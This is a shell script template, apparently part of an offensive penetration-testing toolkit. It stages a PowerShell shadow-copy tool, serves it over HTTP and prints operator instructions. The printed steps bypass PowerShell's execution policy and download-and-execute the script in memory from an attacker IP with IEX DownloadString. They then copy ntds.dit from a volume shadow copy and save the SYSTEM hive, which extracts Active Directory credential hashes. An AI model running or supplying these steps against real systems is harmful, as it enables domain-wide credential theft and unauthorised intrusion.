mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/vshadow/Invoke-vshadow.ps1 packstation/outbound; \
echo '================================================================'; \
echo '                      -----PowerShell-----                      '; \
echo 'Preparation 1: Open Powershell with administrative privileges'; \
echo 'Preparation 2: powershell -ep bypass'; \
echo 'Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/Invoke-vshadow.ps1\')'; \
echo 'Create Snapshot: Invoke-vshadow -volume \'C:\\\''; \
echo 'Extract ntds file: cmd /c copy <shadow copy device>\windows\ntds\ntds.dit <%=$(esh variables/delivery_path_windows)%>\ntds.dit.bak'; \
echo 'Extract system file: reg.exe save hklm\system <%=$(esh variables/delivery_path_windows)%>\system.bak'; \
echo '================================================================'; \
echo '                         -----CMD-----                          '; \
echo '================================================================'; \
python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
